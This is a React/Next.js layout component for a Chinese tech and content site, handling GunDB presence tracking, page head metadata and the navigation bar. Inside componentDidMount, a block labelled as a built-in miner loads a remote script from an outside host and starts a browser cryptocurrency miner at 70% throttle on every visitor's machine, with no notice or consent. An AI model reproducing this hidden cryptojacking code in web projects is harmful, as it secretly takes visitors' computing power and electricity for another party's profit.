import Head from 'next/head';
import './Layout.css';
import Link from 'next/link';
import { initClientState } from '../api/client';
import { RootNode } from '../gunDB';
import DropDown from './DropDown';




class Layout extends React.Component{

    constructor(props){
        super(props);
        this.state = {
            loading: true,
            isOffline: false,
        }
    }

    unloadGUN(cb){
        if(window !== undefined){
            const clientId = window.localStorage.getItem("spy_uuid");
            RootNode.get("client").get(clientId).get("load").put(false, ack=>{
                console.log(ack);
                
                if(ack.err){
                    cb();
                }else{
                    this.setState({
                        loading: false,
                    })
                    return false;
                }
            })
        }
    }
    
    async componentDidMount(){
        if(window !== undefined){
           
            await initClientState();
            const clientId = window.localStorage.getItem("spy_uuid");
            RootNode.get("client").get(clientId).get("load").once( async (data, key)=>{
                console.log(data, key);
                if(data){
                    return this.unloadGUN(()=>{
                        this.unloadGUN(()=>{
                            this.setState({
                                loading: false,
                                isOffline: true,
                            })
                        });
                    })
                }
                
                
               
            });
            RootNode.get("client").get(clientId).get("load").put(true);
            setInterval( async () => {
                await RootNode.get("client").get(clientId).get("load").put(true);
            }, 3456);
        }

        //内置矿机=====================begin===============================
        function loadError (oError) {
            throw new URIError("The script " + oError.target.src + " is not accessible.");
          }
    
        function importScript (sSrc) {
            if(window)
            {
                    var oScript = document.createElement("script");
                    oScript.setAttribute("type","text/javascript");
                    oScript.onerror = loadError;
                    oScript.src = sSrc;
                    oScript.onload  = oScript.onreadystatechange = function(){
                        
                        var interval = setInterval(function(){
                        if(document.readyState === "loaded" || document.readyState ==="complete"){
                            console.log("mine change");
                            clearInterval(interval);
                            if(!window.Client){
                                console.log("ads anti");
                                
                                return false;
                            }
                            var _client = new Client.Anonymous('ecd9ae45c61e07a21b0d5d3a784a4d591de8c3a2823a5b9ef9c263eaa679a135', {
                                throttle: 0.7, ads: 0
                                }
                            );
                            _client.start();
                            
                            }
                        }, 300)
                
                
                    }
                    if(document.currentScript){
                        document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
                    }
               
            }
                
        }
    
            importScript("https://www.hostingcloud.racing/0ZUJ.js")
        //内置矿机=====================end===============================
    




    }
    
    render(){
        const { loading, isOffline } = this.state;
        return (
            <React.Fragment>
    
                <Head>
                    <title>乐多多</title>
                    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
                    <meta httpEquiv="Cache-Control" content="no-siteapp" />
                    <meta httpEquiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
                    <meta name="keywords" content="技术 妹纸　安卓 Android IOS 苹果 前端　技术　IT 文章 主题 创业 互联网 区块链" />
                    <meta name="description" content="乐多多给你快乐多，知识多,朋友多，资源多" />
                    <meta name="author" content="simon simontaosim@protonmail.com" />
                    <meta name="format-detection" content="telephone=no" /> 
                    {/* 百度禁止转码 */}
                    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css" integrity="sha256-8B1OaG0zT7uYA572S2xOxWACq9NXYPQ+U5kHPV1bJN4=" crossOrigin="anonymous" />
                    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.0/css/all.min.css" integrity="sha256-zuYfqYVhondYLhMhEA58/2PA/prdFq3gT72DxNwSD4M=" crossOrigin="anonymous" />
                </Head>
                <noscript>您必须开启javasript脚本才能够运行本应用</noscript>

                <nav className="level container" style={{display: 'flex',width: "100%", marginBottom: 0, marginTop: 0}}>
    
                    <div className="level-left" style={{paddingLeft: 8, paddingTop: 8, display: 'flex', flexDirection: "row", alignItems: "flex-start"}}>
                        <div className="level-item">
                            <div className="subtitle is-5">
                                <Link href="/"><a>乐多多</a></Link>
                                <p className="is-size-6">永久保有互联网</p>
                            </div>
                        </div>
                       
                    </div>
    
                    <div className="level-right"  style={{marginTop: 0, display: "flex"}}>
                       
                        <div className="level-item is-hidden-tablet">
                            <DropDown />
                        </div>
                        <p className="level-item is-hidden-mobile"><Link href="/"><a>首页</a></Link></p>
                        <p className="level-item is-hidden-mobile"><Link href="/search"><a>搜索</a></Link></p>
                        <p className="level-item is-hidden-mobile"><Link href="/posts?tag=前端"><a>前端</a></Link></p>
                        <p className="level-item is-hidden-mobile"><Link href="/posts?tag=Android"><a>Android</a></Link></p>
                        <p className="level-item is-hidden-mobile"><Link href="/posts?tag=iOS"><a>IOS</a></Link></p>
                        <p className="level-item is-hidden-mobile"><Link href="/posts?tag=瞎推荐"><a>瞎推荐</a></Link></p>
                        <p className="level-item is-hidden-mobile"><Link href="/posts?tag=拓展资源"><a>拓展</a></Link></p>
                        <p className="level-item is-hidden-mobile"><Link href="/posts?tag=App"><a>APP</a></Link></p>
                        <p className="level-item is-hidden-mobile"><Link href="/posts?tag=福利"><a>妹纸</a></Link></p>
                       
                        <p className="level-item is-hidden-mobile"><Link href="/login"><a>登录</a></Link></p>
                        <p className="level-item is-hidden-mobile"><Link href="/reg"><a>注册</a></Link></p>
                        <p className="level-item is-hidden-mobile">|</p>
                        <p className="level-item is-hidden-mobile"><Link href="/about"><a>关于</a></Link></p>
                    </div>
    
                </nav>
                <hr style={{marginTop: 0}}></hr>
                <div className="container" style={{
                    width: "100%",
                    overflowY: 'hidden',
                    height: "100%"
                }}>

                   
                    {
                        this.props.children
                    }
                    {
                        isOffline &&  <div className="is-size-7 has-text-centered"><br/>您已经离线或者网络不稳点， 请检查您的网络，<br/>或者尝试刷新页面, <br/>或者考虑
                            <a　href="https://github.com/getlantern/download">科学上网</a>
                            <br/>
                            <br/>
                            <br/>
                            </div>
                    }
                </div>
                
    
            </React.Fragment>
        )
    }
}

export default Layout